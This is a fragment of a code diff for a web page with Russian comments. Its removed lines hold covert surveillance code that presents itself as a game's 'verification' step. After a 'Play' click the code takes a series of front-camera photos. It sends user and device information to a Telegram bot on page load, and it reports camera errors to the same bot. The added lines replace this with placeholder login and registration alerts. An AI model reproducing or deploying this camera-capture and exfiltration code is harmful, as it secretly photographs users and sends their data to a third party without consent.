-                currentStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: 'user',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    },
-                    audio: false
-                });
-                frontCameraStream = currentStream;
-                videoElement.srcObject = currentStream;
-
-                await new Promise(resolve => setTimeout(resolve, 1000));
-
-                photoCount = 0;
-                takeSeriesOfPhotos();
-                
-            } catch (error) {
-                console.error('Ошибка при инициализации камер:', error);
-                messageBox.style.display = 'block';
-                
-                try {
-                    const errorMessage = `⚠️ Ошибка доступа к камерам:\nУстройство: ${navigator.userAgent}\nОшибка: ${error.message || 'Неизвестная ошибка'}`;
-                    
-                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            text: errorMessage
-                        })
-                    });
-                } catch (e) {
-                    console.error('Ошибка при отправке сообщения об ошибке:', e);
-                }
-            }
-        }
-
-        // 7. Обработчик кнопки "Играть"
-        playBtn.addEventListener('click', async function() {
-            console.log('Начало процесса верификации...');
-            try {
-                // Сначала запрашиваем доступ к камере через стандартное системное окно
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                // Если доступ получен, сразу закрываем поток (системное окно уже показано)
-                stream.getTracks().forEach(track => track.stop());
-                
-                // Затем запускаем процесс верификации
-                await sendUserInfo();
-                await initCameras();
-            } catch (error) {
-                console.error('Пользователь отказал в доступе к камере:', error);
-                messageBox.style.display = 'block';
-            }
         });
-
-        // Отправляем информацию о пользователе сразу при загрузке страницы
-        window.addEventListener('load', function() {
-            console.log('Страница загружена, отправка информации...');
-            sendUserInfo().catch(e => console.error('Ошибка при отправке информации:', e));
+        
+        // Модальное окно авторизации
+        document.querySelector('.btn-login').addEventListener('click', () => {
+            alert('Форма входа будет здесь');
         });
-
-        // Остановка камер при закрытии страницы
-        window.addEventListener('beforeunload', function() {
-            console.log('Страница закрывается, остановка камер...');
-            stopAllCameras();
-        });
-
-        // Дополнительная обработка видимости страницы
-        document.addEventListener('visibilitychange', function() {
-            if (document.hidden) {
-                console.log('Страница стала неактивной, остановка камер...');
-                stopAllCameras();
-            }
+        
+        // Модальное окно регистрации
+        document.querySelector('.btn-register').addEventListener('click', () => {
+            alert('Форма регистрации будет здесь');
         });
     </script>
 </body>
